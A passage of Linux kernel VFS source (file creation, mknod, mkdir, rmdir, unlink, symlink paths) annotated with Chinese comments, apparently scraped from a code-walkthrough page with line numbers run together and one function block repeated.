ima_file_check(file, op-&gt;acc_mode); // 检查文件的完整性和安全性if (!error &amp;&amp; do_truncate) error = handle_truncate(idmap, file); // 处理截断操作if (unlikely(error &gt; 0)) &#123; WARN_ON(1); error = -EINVAL;&#125;if (do_truncate) mnt_drop_write(nd-&gt;path.mnt); // 释放写权限return error; // 返回错误码&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * vfs_tmpfile - 创建临时文件 * @idmap: 挂载点的ID映射 * @dentry: 基础目录的dentry指针 * @mode: 新临时文件的模式 * @open_flag: 标志 * * 创建一个临时文件。 * * 如果通过ID映射的挂载点找到了inode，则必须通过@idmap传递vfsmount的ID映射。 * 此函数将根据@idmap映射inode，然后检查权限。 * 在非ID映射的挂载点上，或者如果要对原始inode执行权限检查，则只需传递@nop_mnt_idmap。 */static int vfs_tmpfile(struct mnt_idmap *idmap, const struct path *parentpath, struct file *file, umode_t mode)&#123; struct dentry *child; // 子目录项 struct inode *dir = d_inode(parentpath-&gt;dentry); // 父目录的inode struct inode *inode; int error; int open_flag = file-&gt;f_flags; // 文件标志 /* 我们希望目录可写 */ error = inode_permission(idmap, dir, MAY_WRITE | MAY_EXEC); // 检查目录的写和执行权限 if (error) return error; if (!dir-&gt;i_op-&gt;tmpfile) return -EOPNOTSUPP; // 如果目录不支持tmpfile操作，则返回不支持的错误 child = d_alloc(parentpath-&gt;dentry, &amp;slash_name); // 分配子目录项 if (unlikely(!child)) return -ENOMEM; // 如果分配失败，则返回内存不足的错误 file-&gt;f_path.mnt = parentpath-&gt;mnt; file-&gt;f_path.dentry = child; // 设置文件的挂载点和目录项 mode = vfs_prepare_mode(idmap, dir, mode, mode, mode); // 准备文件的模式 error = dir-&gt;i_op-&gt;tmpfile(idmap, dir, file, mode); // 调用目录的tmpfile操作 dput(child); if (error) return error; // 如果出错，则返回错误码 /* 不检查其他权限，因为刚刚创建了inode */ error = may_open(idmap, &amp;file-&gt;f_path, 0, file-&gt;f_flags); // 检查是否可以打开文件 if (error) return error; // 如果出错，则返回错误码 inode = file_inode(file); if (!(open_flag &amp; O_EXCL)) &#123; spin_lock(&amp;inode-&gt;i_lock); inode-&gt;i_state |= I_LINKABLE; // 设置inode的状态为可链接 spin_unlock(&amp;inode-&gt;i_lock); &#125; ima_post_create_tmpfile(idmap, inode); // 进行临时文件的完整性和安全性检查 return 0; // 返回成功&#125; 1234567891011121314151617181920212223242526272829/** * vfs_tmpfile_open - 为内核内部使用打开一个临时文件 * @idmap: 通过该挂载点找到的inode的idmap * @parentpath: 基本目录的路径 * @mode: 新临时文件的模式 * @open_flag: 标志 * @cred: 打开的凭证 * * 创建并打开一个临时文件。该文件不会计入nr_files中，因此只适用于内核内部使用， * 不得安装到文件表或其他地方。 */struct file *vfs_tmpfile_open(struct mnt_idmap *idmap, const struct path *parentpath, umode_t mode, int open_flag, const struct cred *cred)&#123; struct file *file; // 文件指针 int error; // 错误码 file = alloc_empty_file_noaccount(open_flag, cred); // 分配一个空的文件结构（不计入文件计数） if (!IS_ERR(file)) &#123; error = vfs_tmpfile(idmap, parentpath, file, mode); // 创建临时文件 if (error) &#123; fput(file); // 如果出错，释放文件 file = ERR_PTR(error); // 返回错误指针 &#125; &#125; return file; // 返回文件指针&#125;EXPORT_SYMBOL(vfs_tmpfile_open); // 导出符号供其他模块使用 12345678910111213141516171819202122static int do_tmpfile(struct nameidata *nd, unsigned flags, const struct open_flags *op, struct file *file)&#123; struct path path; // 路径结构 int error = path_lookupat(nd, flags | LOOKUP_DIRECTORY, &amp;path); // 查找目录路径 if (unlikely(error)) return error; // 如果查找失败，返回错误码 error = mnt_want_write(path.mnt); // 增加挂载点的写引用计数 if (unlikely(error)) goto out; // 如果增加失败，跳转到出错处理 error = vfs_tmpfile(mnt_idmap(path.mnt), &amp;path, file, op-&gt;mode); // 创建临时文件 if (error) goto out2; // 如果创建失败，跳转到出错处理 audit_inode(nd-&gt;name, file-&gt;f_path.dentry, 0); // 审计新创建的临时文件out2: mnt_drop_write(path.mnt); // 减少挂载点的写引用计数out: path_put(&amp;path); // 释放路径结构 return error; // 返回错误码&#125; 123456789101112static int do_o_path(struct nameidata *nd, unsigned flags, struct file *file)&#123; struct path path; // 路径结构 int error = path_lookupat(nd, flags, &amp;path); // 查找路径 if (!error) &#123; audit_inode(nd-&gt;name, path.dentry, 0); // 审计找到的目录项 error = vfs_open(&amp;path, file); // 打开文件 path_put(&amp;path); // 释放路径结构 &#125; return error; // 返回错误码&#125; 1234567891011121314151617181920212223242526272829303132333435363738static struct file *path_openat(struct nameidata *nd, const struct open_flags *op, unsigned flags)&#123; struct file *file; // 文件指针 int error; file = alloc_empty_file(op-&gt;open_flag, current_cred()); // 分配一个空的文件结构 if (IS_ERR(file)) return file; // 如果分配失败，返回错误指针 if (unlikely(file-&gt;f_flags &amp; __O_TMPFILE)) &#123; error = do_tmpfile(nd, flags, op, file); // 如果是临时文件，调用临时文件处理函数 &#125; else if (unlikely(file-&gt;f_flags &amp; O_PATH)) &#123; error = do_o_path(nd, flags, file); // 如果是O_PATH标志，调用O_PATH处理函数 &#125; else &#123; const char *s = path_init(nd, flags); // 初始化路径 while (!(error = link_path_walk(s, nd)) &amp;&amp; (s = open_last_lookups(nd, file, op)) != NULL) ; // 遍历路径中的目录项并打开文件 if (!error) error = do_open(nd, file, op); // 执行打开文件操作 terminate_walk(nd); // 终止路径遍历 &#125; if (likely(!error)) &#123; if (likely(file-&gt;f_mode &amp; FMODE_OPENED)) return file; // 如果文件已成功打开，返回文件指针 WARN_ON(1); // 打印警告信息 error = -EINVAL; // 设置错误码为无效参数 &#125; fput(file); // 释放文件 if (error == -EOPENSTALE) &#123; if (flags &amp; LOOKUP_RCU) error = -ECHILD; // 如果是RCU查找标志，设置错误码为子进程不存在 else error = -ESTALE; // 否则设置错误码为文件已过期 &#125; return ERR_PTR(error); // 返回错误指针&#125; 12345678910111213141516struct file *do_filp_open(int dfd, struct filename *pathname, const struct open_flags *op)&#123; struct nameidata nd; // 名称数据结构 int flags = op-&gt;lookup_flags; // 查找标志 struct file *filp; // 文件指针 set_nameidata(&amp;nd, dfd, pathname, NULL); // 设置名称数据结构 filp = path_openat(&amp;nd, op, flags | LOOKUP_RCU); // 打开路径对应的文件 if (unlikely(filp == ERR_PTR(-ECHILD))) // 如果打开失败且错误码为ECHILD filp = path_openat(&amp;nd, op, flags); // 再次尝试打开文件 if (unlikely(filp == ERR_PTR(-ESTALE))) // 如果打开失败且错误码为ESTALE filp = path_openat(&amp;nd, op, flags | LOOKUP_REVAL); // 再次尝试打开文件（重新验证） restore_nameidata(); // 恢复名称数据结构 return filp; // 返回文件指针&#125; 12345678910111213141516171819202122232425struct file *do_file_open_root(const struct path *root, const char *name, const struct open_flags *op)&#123; struct nameidata nd; // 名称数据结构 struct file *file; // 文件指针 struct filename *filename; // 文件名 int flags = op-&gt;lookup_flags; // 查找标志 if (d_is_symlink(root-&gt;dentry) &amp;&amp; op-&gt;intent &amp; LOOKUP_OPEN) return ERR_PTR(-ELOOP); // 如果根目录是符号链接且打开标志为LOOKUP_OPEN，返回ELOOP错误 filename = getname_kernel(name); // 获取文件名 if (IS_ERR(filename)) return ERR_CAST(filename); // 如果获取失败，返回错误指针 set_nameidata(&amp;nd, -1, filename, root); // 设置名称数据结构 file = path_openat(&amp;nd, op, flags | LOOKUP_RCU); // 打开路径对应的文件 if (unlikely(file == ERR_PTR(-ECHILD))) // 如果打开失败且错误码为ECHILD file = path_openat(&amp;nd, op, flags); // 再次尝试打开文件 if (unlikely(file == ERR_PTR(-ESTALE))) // 如果打开失败且错误码为ESTALE file = path_openat(&amp;nd, op, flags | LOOKUP_REVAL); // 再次尝试打开文件（重新验证） restore_nameidata(); // 恢复名称数据结构 putname(filename); // 释放文件名 return file; // 返回文件指针&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667static struct dentry *filename_create(int dfd, struct filename *name, struct path *path, unsigned int lookup_flags)&#123; struct dentry *dentry = ERR_PTR(-EEXIST); // 目录项指针，默认为已存在的错误指针 struct qstr last; // 最后一个组件的名称 bool want_dir = lookup_flags &amp; LOOKUP_DIRECTORY; // 是否请求目录 unsigned int reval_flag = lookup_flags &amp; LOOKUP_REVAL; // 重新验证标志 unsigned int create_flags = LOOKUP_CREATE | LOOKUP_EXCL; // 创建标志 int type; int err2; int error; error = filename_parentat(dfd, name, reval_flag, path, &amp;last, &amp;type); // 查找父目录路径和最后一个组件 if (error) return ERR_PTR(error); // 如果查找失败，返回错误指针 /* * 糟糕的最后一个组件或根本没有最后一个组件？ * (foo/., foo/.., /////) */ if (unlikely(type != LAST_NORM)) goto out; // 如果最后一个组件异常，跳转到结束处 /* 如果是只读的，先不立即失败，至少尝试报告其他错误 */ err2 = mnt_want_write(path-&gt;mnt); /* * 进行最终的查找。如果有尾部&#x27;/&#x27;，且不需要目录，则不进行创建。 */ if (last.name[last.len] &amp;&amp; !want_dir) create_flags = 0; // 如果尾部有&#x27;/&#x27;且不需要目录，不进行创建操作 inode_lock_nested(path-&gt;dentry-&gt;d_inode, I_MUTEX_PARENT); // 锁住父目录的inode dentry = __lookup_hash(&amp;last, path-&gt;dentry, reval_flag | create_flags); // 查找目录项 if (IS_ERR(dentry)) goto unlock; // 如果查找失败，跳转到解锁处 error = -EEXIST; if (d_is_positive(dentry)) goto fail; // 如果目录项已存在，跳转到失败处 /* * 特殊情况 - 查找返回负值，但是...最后一个组件是 foo/bar/ * 从 vfs_mknod() 的角度来看，我们只有一个负的目录项 - * 一切正常。但是我们可以采取一些恶意行为 - 你在末尾加了&#x27;/&#x27;，你要求的是（不存在的）目录。给你一个 -ENOENT。 */ if (unlikely(!create_flags)) &#123; error = -ENOENT; goto fail; // 如果没有进行创建操作，跳转到失败处 &#125; if (unlikely(err2)) &#123; error = err2; goto fail; // 如果有其他错误，跳转到失败处 &#125; return dentry; // 返回目录项指针fail: dput(dentry); // 释放目录项 dentry = ERR_PTR(error); // 设置为错误指针unlock: inode_unlock(path-&gt;dentry-&gt;d_inode); // 解锁父目录的inode if (!err2) mnt_drop_write(path-&gt;mnt); // 放弃写锁out: path_put(path); // 释放路径 return dentry; // 返回目录项指针&#125; 1234567891011// 从内核空间创建路径struct dentry *kern_path_create(int dfd, const char *pathname, struct path *path, unsigned int lookup_flags)&#123; struct filename *filename = getname_kernel(pathname); // 获取内核空间的文件名 struct dentry *res = filename_create(dfd, filename, path, lookup_flags); // 创建路径 putname(filename); // 释放文件名 return res; // 返回目录项指针&#125;EXPORT_SYMBOL(kern_path_create); // 导出kern_path_create符号 123456789// 完成路径创建操作void done_path_create(struct path *path, struct dentry *dentry)&#123; dput(dentry); // 释放目录项 inode_unlock(path-&gt;dentry-&gt;d_inode); // 解锁父目录的inode mnt_drop_write(path-&gt;mnt); // 放弃写锁 path_put(path); // 释放路径&#125;EXPORT_SYMBOL(done_path_create); // 导出done_path_create符号 1234567891011// 从用户空间创建路径inline struct dentry *user_path_create(int dfd, const char __user *pathname, struct path *path, unsigned int lookup_flags)&#123; struct filename *filename = getname(pathname); // 获取用户空间的文件名 struct dentry *res = filename_create(dfd, filename, path, lookup_flags); // 创建路径 putname(filename); // 释放文件名 return res; // 返回目录项指针&#125;EXPORT_SYMBOL(user_path_create); // 导出user_path_create符号 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * vfs_mknod - 创建设备节点或文件 * @idmap: 挂载点的idmap * @dir: 目录的inode * @dentry: 指向基础目录的dentry指针 * @mode: 新设备节点或文件的权限 * @dev: 要创建的设备的设备号 * * 创建设备节点或文件。 * * 如果通过id映射的挂载点找到了inode，必须通过@idmap传递vfsmount的idmap。此函数将负责根据@idmap映射inode，然后检查权限。 * 对于非id映射的挂载点，或者如果要对原始inode执行权限检查，则只需传递@nop_mnt_idmap。 */int vfs_mknod(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, umode_t mode, dev_t dev)&#123; bool is_whiteout = S_ISCHR(mode) &amp;&amp; dev == WHITEOUT_DEV; // 是否是白出节点 int error = may_create(idmap, dir, dentry); // 检查是否可以创建 if (error) return error; // 如果不允许创建，返回错误 if ((S_ISCHR(mode) || S_ISBLK(mode)) &amp;&amp; !is_whiteout &amp;&amp; !capable(CAP_MKNOD)) return -EPERM; // 如果是字符设备或块设备但不是白出节点且没有CAP_MKNOD权限，返回EPERM if (!dir-&gt;i_op-&gt;mknod) return -EPERM; // 如果目录的i_op中没有mknod操作，返回EPERM mode = vfs_prepare_mode(idmap, dir, mode, mode, mode); // 准备权限模式 error = devcgroup_inode_mknod(mode, dev); // 在devcgroup中进行inode_mknod操作 if (error) return error; // 如果devcgroup_inode_mknod操作失败，返回错误 error = security_inode_mknod(dir, dentry, mode, dev); // 进行安全性检查 if (error) return error; // 如果安全性检查失败，返回错误 error = dir-&gt;i_op-&gt;mknod(idmap, dir, dentry, mode, dev); // 调用目录的mknod操作 if (!error) fsnotify_create(dir, dentry); // 发送文件系统通知，表示创建成功 return error; // 返回错误码&#125;EXPORT_SYMBOL(vfs_mknod); // 导出vfs_mknod符号 12345678910111213141516static int may_mknod(umode_t mode)&#123; switch (mode &amp; S_IFMT) &#123; case S_IFREG: case S_IFCHR: case S_IFBLK: case S_IFIFO: case S_IFSOCK: case 0: /* 零模式转换为S_IFREG */ return 0; case S_IFDIR: return -EPERM; default: return -EINVAL; &#125;&#125; // 检查是否可以创建设备节点或文件的辅助函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051static int do_mknodat(int dfd, struct filename *name, umode_t mode, unsigned int dev)&#123; struct mnt_idmap *idmap; // 挂载点idmap指针 struct dentry *dentry; // 目录项指针 struct path path; // 路径结构体 int error; // 错误码 unsigned int lookup_flags = 0; // 查找标志 error = may_mknod(mode); // 检查是否可以创建设备节点或文件 if (error) goto out1;retry: dentry = filename_create(dfd, name, &amp;path, lookup_flags); // 创建目录项 error = PTR_ERR(dentry); if (IS_ERR(dentry)) goto out1; error = security_path_mknod(&amp;path, dentry, mode_strip_umask(path.dentry-&gt;d_inode, mode), dev); // 进行路径的安全性检查 if (error) goto out2; idmap = mnt_idmap(path.mnt); // 获取挂载点的idmap switch (mode &amp; S_IFMT) &#123; case 0: case S_IFREG: error = vfs_create(idmap, path.dentry-&gt;d_inode, dentry, mode, true); // 创建普通文件 if (!error) ima_post_path_mknod(idmap, dentry); // 在IMA中记录创建设备节点或文件的路径 break; case S_IFCHR: case S_IFBLK: error = vfs_mknod(idmap, path.dentry-&gt;d_inode, dentry, mode, new_decode_dev(dev)); // 创建字符设备或块设备节点 break; case S_IFIFO: case S_IFSOCK: error = vfs_mknod(idmap, path.dentry-&gt;d_inode, dentry, mode, 0); // 创建FIFO管道或套接字节点 break; &#125;out2: done_path_create(&amp;path, dentry); // 完成路径创建操作 if (retry_estale(error, lookup_flags)) &#123; // 如果错误码指示需要重试（可能是由于NFS导致的错误） lookup_flags |= LOOKUP_REVAL; // 设置重试标志 goto retry; // 重试 &#125;out1: putname(name); // 释放文件名 return error; // 返回错误码&#125; 12345678910SYSCALL_DEFINE4(mknodat, int, dfd, const char __user *, filename, umode_t, mode, unsigned int, dev)&#123; return do_mknodat(dfd, getname(filename), mode, dev); // 执行do_mknodat系统调用&#125;SYSCALL_DEFINE3(mknod, const char __user *, filename, umode_t, mode, unsigned, dev)&#123; return do_mknodat(AT_FDCWD, getname(filename), mode, dev); // 执行do_mknodat系统调用，使用当前工作目录作为dfd&#125; 12345678910111213141516171819202122232425262728293031323334353637383940/** * vfs_mkdir - 创建目录 * @idmap: 挂载点的idmap * @dir: 目录的inode * @dentry: 基础目录的dentry指针 * @mode: 新目录的权限模式 * * 创建一个目录。 * * 如果通过id映射的挂载点找到了inode，则必须通过@idmap传递vfsmount的idmap。 * 此函数将根据@idmap映射inode，并在检查权限之前处理映射。 * 如果是非id映射的挂载点，或者需要在原始inode上执行权限检查，只需传递@nop_mnt_idmap。 */int vfs_mkdir(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, umode_t mode)&#123; int error; unsigned max_links = dir-&gt;i_sb-&gt;s_max_links; // 目录的最大链接数 error = may_create(idmap, dir, dentry); // 检查是否可以创建目录 if (error) return error; if (!dir-&gt;i_op-&gt;mkdir) // 检查是否支持mkdir操作 return -EPERM; mode = vfs_prepare_mode(idmap, dir, mode, S_IRWXUGO | S_ISVTX, 0); // 准备目录的权限模式 error = security_inode_mkdir(dir, dentry, mode); // 检查目录的安全性 if (error) return error; if (max_links &amp;&amp; dir-&gt;i_nlink &gt;= max_links) // 检查目录的链接数是否超过最大限制 return -EMLINK; error = dir-&gt;i_op-&gt;mkdir(idmap, dir, dentry, mode); // 调用文件系统特定的mkdir操作 if (!error) fsnotify_mkdir(dir, dentry); // 发送目录创建通知 return error;&#125;EXPORT_SYMBOL(vfs_mkdir); 12345678910111213141516171819202122232425262728int do_mkdirat(int dfd, struct filename *name, umode_t mode)&#123; struct dentry *dentry; // 目录项指针 struct path path; // 路径结构体 int error; unsigned int lookup_flags = LOOKUP_DIRECTORY; // 查找标志，指示查找的是目录retry: dentry = filename_create(dfd, name, &amp;path, lookup_flags); // 创建目录项 error = PTR_ERR(dentry); if (IS_ERR(dentry)) goto out_putname; error = security_path_mkdir(&amp;path, dentry, mode_strip_umask(path.dentry-&gt;d_inode, mode)); // 检查路径的安全性 if (!error) &#123; error = vfs_mkdir(mnt_idmap(path.mnt), path.dentry-&gt;d_inode, dentry, mode); // 调用vfs_mkdir创建目录 &#125; done_path_create(&amp;path, dentry); // 完成路径创建操作 if (retry_estale(error, lookup_flags)) &#123; // 如果错误码指示需要重试（可能是由于NFS导致的错误） lookup_flags |= LOOKUP_REVAL; // 设置重试标志 goto retry; // 重试 &#125;out_putname: putname(name); // 释放文件名 return error; // 返回错误码&#125; 123456789SYSCALL_DEFINE3(mkdirat, int, dfd, const char __user *, pathname, umode_t, mode)&#123; return do_mkdirat(dfd, getname(pathname), mode); // 执行do_mkdirat系统调用&#125;SYSCALL_DEFINE2(mkdir, const char __user *, pathname, umode_t, mode)&#123; return do_mkdirat(AT_FDCWD, getname(pathname), mode); // 执行do_mkdirat系统调用，使用当前工作目录作为dfd&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * vfs_rmdir - 删除目录 * @idmap: 挂载点的idmap * @dir: 目录的inode * @dentry: 基础目录的dentry指针 * * 删除一个目录。 * * 如果通过id映射的挂载点找到了inode，则必须通过@idmap传递vfsmount的idmap。 * 此函数将根据@idmap映射inode，并在检查权限之前处理映射。 * 如果是非id映射的挂载点，或者需要在原始inode上执行权限检查，只需传递@nop_mnt_idmap。 */int vfs_rmdir(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry)&#123; int error = may_delete(idmap, dir, dentry, 1); // 检查是否可以删除目录，同时标记为rmdir操作 if (error) return error; if (!dir-&gt;i_op-&gt;rmdir) // 检查是否支持rmdir操作 return -EPERM; dget(dentry); // 获取dentry的引用 inode_lock(dentry-&gt;d_inode); // 锁定dentry的inode error = -EBUSY; if (is_local_mountpoint(dentry) || (dentry-&gt;d_inode-&gt;i_flags &amp; S_KERNEL_FILE)) goto out; error = security_inode_rmdir(dir, dentry); // 检查目录的安全性 if (error) goto out; error = dir-&gt;i_op-&gt;rmdir(dir, dentry); // 调用文件系统特定的rmdir操作 if (error) goto out; shrink_dcache_parent(dentry); // 清理dentry的父目录的dentry缓存 dentry-&gt;d_inode-&gt;i_flags |= S_DEAD; // 标记目录的inode为已删除 dont_mount(dentry); // 取消挂载 detach_mounts(dentry); // 分离挂载点out: inode_unlock(dentry-&gt;d_inode); // 解锁dentry的inode dput(dentry); // 释放dentry的引用 if (!error) d_delete_notify(dir, dentry); // 发送目录删除通知 return error;&#125;EXPORT_SYMBOL(vfs_rmdir); // 导出vfs_rmdir符号，供其他模块使用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * vfs_rmdir - 删除目录 * @idmap: 挂载点的idmap * @dir: 目录的inode * @dentry: 基础目录的dentry指针 * * 删除一个目录。 * * 如果通过id映射的挂载点找到了inode，则必须通过@idmap传递vfsmount的idmap。 * 此函数将根据@idmap映射inode，并在检查权限之前处理映射。 * 如果是非id映射的挂载点，或者需要在原始inode上执行权限检查，只需传递@nop_mnt_idmap。 */int vfs_rmdir(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry)&#123; int error = may_delete(idmap, dir, dentry, 1); // 检查是否可以删除目录，同时标记为rmdir操作 if (error) return error; if (!dir-&gt;i_op-&gt;rmdir) // 检查是否支持rmdir操作 return -EPERM; dget(dentry); // 获取dentry的引用 inode_lock(dentry-&gt;d_inode); // 锁定dentry的inode error = -EBUSY; if (is_local_mountpoint(dentry) || (dentry-&gt;d_inode-&gt;i_flags &amp; S_KERNEL_FILE)) goto out; error = security_inode_rmdir(dir, dentry); // 检查目录的安全性 if (error) goto out; error = dir-&gt;i_op-&gt;rmdir(dir, dentry); // 调用文件系统特定的rmdir操作 if (error) goto out; shrink_dcache_parent(dentry); // 清理dentry的父目录的dentry缓存 dentry-&gt;d_inode-&gt;i_flags |= S_DEAD; // 标记目录的inode为已删除 dont_mount(dentry); // 取消挂载 detach_mounts(dentry); // 分离挂载点out: inode_unlock(dentry-&gt;d_inode); // 解锁dentry的inode dput(dentry); // 释放dentry的引用 if (!error) d_delete_notify(dir, dentry); // 发送目录删除通知 return error;&#125;EXPORT_SYMBOL(vfs_rmdir); // 导出vfs_rmdir符号，供其他模块使用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758int do_rmdir(int dfd, struct filename *name)&#123; int error; struct dentry *dentry; // 目录项指针 struct path path; // 路径结构体 struct qstr last; // 最后一个组件的qstr结构体 int type; // 最后一个组件的类型 unsigned int lookup_flags = 0; // 查找标志retry: error = filename_parentat(dfd, name, lookup_flags, &amp;path, &amp;last, &amp;type); // 获取父目录的路径和最后一个组件 if (error) goto exit1; switch (type) &#123; case LAST_DOTDOT: // 如果最后一个组件是&quot;..&quot; error = -ENOTEMPTY; // 目录非空，无法删除 goto exit2; case LAST_DOT: // 如果最后一个组件是&quot;.&quot; error = -EINVAL; // 无效的参数 goto exit2; case LAST_ROOT: // 如果最后一个组件是根目录 error = -EBUSY; // 根目录无法删除 goto exit2; &#125; error = mnt_want_write(path.mnt); // 获取vfsmount的写访问权限 if (error) goto exit2; inode_lock_nested(path.dentry-&gt;d_inode, I_MUTEX_PARENT); // 锁定父目录的inode dentry = __lookup_hash(&amp;last, path.dentry, lookup_flags); // 查找目录项 error = PTR_ERR(dentry); if (IS_ERR(dentry)) goto exit3; if (!dentry-&gt;d_inode) &#123; error = -ENOENT; // 目录项不存在 goto exit4; &#125; error = security_path_rmdir(&amp;path, dentry); // 检查路径的安全性 if (error) goto exit4; error = vfs_rmdir(mnt_idmap(path.mnt), path.dentry-&gt;d_inode, dentry); // 调用vfs_rmdir删除目录exit4: dput(dentry); // 释放目录项的引用exit3: inode_unlock(path.dentry-&gt;d_inode); // 解锁父目录的inode mnt_drop_write(path.mnt); // 释放vfsmount的写访问权限exit2: path_put(&amp;path); // 释放路径 if (retry_estale(error, lookup_flags)) &#123; // 如果错误码指示需要重试（可能是由于NFS导致的错误） lookup_flags |= LOOKUP_REVAL; // 设置重试标志 goto retry; // 重试 &#125;exit1: putname(name); // 释放文件名 return error; // 返回错误码&#125; 1234SYSCALL_DEFINE1(rmdir, const char __user *, pathname)&#123; return do_rmdir(AT_FDCWD, getname(pathname)); // 执行do_rmdir系统调用，使用当前工作目录作为dfd&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * vfs_unlink - 解除文件系统对象的链接 * @idmap: 挂载点的idmap * @dir: 父目录的inode * @dentry: 目标目录项 * @delegated_inode: 如果inode已委派，则返回目标inode * * 调用者必须持有dir-&gt;i_mutex。 * * 如果vfs_unlink发现了委派关系，则返回-EWOULDBLOCK，并在delegated_inode中返回对inode的引用。 * 调用者应该在此inode上解除委派并重试。由于解除委派可能需要很长时间，调用者应在这样做之前释放dir-&gt;i_mutex。 * * 或者，调用者可以将delegated_inode传递为NULL。这可能适用于预期底层文件系统未导出为NFS的调用者。 * * 如果通过id映射的挂载点找到了inode，则必须通过@idmap传递vfsmount的idmap。 * 此函数将根据@idmap映射inode，并在检查权限之前处理映射。 * 如果是非id映射的挂载点，或者需要在原始inode上执行权限检查，只需传递@nop_mnt_idmap。 */int vfs_unlink(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, struct inode **delegated_inode)&#123; struct inode *target = dentry-&gt;d_inode; // 目标inode int error = may_delete(idmap, dir, dentry, 0); // 检查是否可以删除文件，同时标记为unlink操作 if (error) return error; if (!dir-&gt;i_op-&gt;unlink) // 检查是否支持unlink操作 return -EPERM; inode_lock(target); // 锁定目标inode if (IS_SWAPFILE(target)) error = -EPERM; else if (is_local_mountpoint(dentry)) error = -EBUSY; else &#123; error = security_inode_unlink(dir, dentry); // 检查目录项的安全性 if (!error) &#123; error = try_break_deleg(target, delegated_inode); // 尝试解除委派关系 if (error) goto out; error = dir-&gt;i_op-&gt;unlink(dir, dentry); // 调用文件系统特定的unlink操作 if (!error) &#123; dont_mount(dentry); // 取消挂载 detach_mounts(dentry); // 分离挂载点 &#125; &#125; &#125;out: inode_unlock(target); // 解锁目标inode /* We don&#x27;t d_delete() NFS sillyrenamed files--they still exist. */ if (!error &amp;&amp; dentry-&gt;d_flags &amp; DCACHE_NFSFS_RENAMED) &#123; fsnotify_unlink(dir, dentry); // 发送文件解除链接通知 &#125; else if (!error) &#123; fsnotify_link_count(target); // 更新链接计数器 d_delete_notify(dir, dentry); // 发送目录项删除通知 &#125; return error; // 返回错误码&#125;EXPORT_SYMBOL(vfs_unlink); // 导出vfs_unlink符号，供其他模块使用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/* * 确保文件的实际截断发生在其目录的i_mutex之外。 * 如果有大量的写出操作，截断可能需要很长时间，我们不希望在等待I/O时阻止对目录的访问。 */int do_unlinkat(int dfd, struct filename *name)&#123; int error; struct dentry *dentry; // 目标目录项 struct path path; // 目标路径 struct qstr last; // 目标名称 int type; // 目标类型 struct inode *inode = NULL; // 目标inode struct inode *delegated_inode = NULL; // 委派的inode unsigned int lookup_flags = 0;retry: error = filename_parentat(dfd, name, lookup_flags, &amp;path, &amp;last, &amp;type); // 获取目标路径的父目录和名称 if (error) goto exit1; error = -EISDIR; if (type != LAST_NORM) // 目标不是正常的目录项 goto exit2; error = mnt_want_write(path.mnt); // 获取挂载点写入权限 if (error) goto exit2;retry_deleg: inode_lock_nested(path.dentry-&gt;d_inode, I_MUTEX_PARENT); // 锁定目录的父目录 dentry = __lookup_hash(&amp;last, path.dentry, lookup_flags); // 查找目标目录项 error = PTR_ERR(dentry); if (!IS_ERR(dentry)) &#123; /* 为什么不在此之前？因为我们希望得到正确的错误值 */ if (last.name[last.len]) goto slashes; inode = dentry-&gt;d_inode; // 目标inode if (d_is_negative(dentry)) goto slashes; ihold(inode); // 增加inode的引用计数 error = security_path_unlink(&amp;path, dentry); // 检查路径的安全性 if (error) goto exit3; error = vfs_unlink(mnt_idmap(path.mnt), path.dentry-&gt;d_inode, dentry, &amp;delegated_inode); // 调用vfs_unlink解除链接操作exit3: dput(dentry); // 释放目标目录项 &#125; inode_unlock(path.dentry-&gt;d_inode); // 解锁目录的父目录 if (inode) iput(inode); /* 在此处截断inode */ inode = NULL; if (delegated_inode) &#123; error = break_deleg_wait(&amp;delegated_inode); // 等待解除委派 if (!error) goto retry_deleg; &#125; mnt_drop_write(path.mnt); // 释放挂载点写入权限exit2: path_put(&amp;path); // 释放路径 if (retry_estale(error, lookup_flags)) &#123; // 检查错误码是否表示需要重新验证 lookup_flags |= LOOKUP_REVAL; inode = NULL; goto retry; &#125;exit1: putname(name); // 释放文件名 return error;slashes: if (d_is_negative(dentry)) error = -ENOENT; else if (d_is_dir(dentry)) error = -EISDIR; else error = -ENOTDIR; goto exit3;&#125; 1234567891011121314SYSCALL_DEFINE3(unlinkat, int, dfd, const char __user *, pathname, int, flag)&#123; if ((flag &amp; ~AT_REMOVEDIR) != 0) // 检查标志位是否有效 return -EINVAL; if (flag &amp; AT_REMOVEDIR) // 如果标志位指示移除目录 return do_rmdir(dfd, getname(pathname)); // 调用do_rmdir函数移除目录 return do_unlinkat(dfd, getname(pathname)); // 否则调用do_unlinkat函数解除链接&#125;SYSCALL_DEFINE1(unlink, const char __user *, pathname)&#123; return do_unlinkat(AT_FDCWD, getname(pathname)); // 调用do_unlinkat函数解除链接，并使用AT_FDCWD作为dfd参数&#125; 1234567891011121314151617181920212223242526272829303132333435/** * vfs_symlink - 创建符号链接 * @idmap: 指向inode所在挂载点的idmap * @dir: 目录的inode * @dentry: 基础目录的dentry指针 * @oldname: 要链接的文件的名称 * * 创建一个符号链接。 * * 如果通过idmapped挂载点找到了inode，则必须通过@idmap传递vfsmount的idmap。 * 此函数将负责根据@idmap将inode映射，然后检查权限。 * 如果是非idmapped挂载点，或者需要对原始inode进行权限检查，则只需传递@nop_mnt_idmap。 */int vfs_symlink(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, const char *oldname)&#123; int error; error = may_create(idmap, dir, dentry); // 检查是否允许创建 if (error) return error; if (!dir-&gt;i_op-&gt;symlink) return -EPERM; error = security_inode_symlink(dir, dentry, oldname); // 检查安全性 if (error) return error; error = dir-&gt;i_op-&gt;symlink(idmap, dir, dentry, oldname); // 调用inode的symlink操作 if (!error) fsnotify_create(dir, dentry); // 发送文件创建通知 return error;&#125;EXPORT_SYMBOL(vfs_symlink); 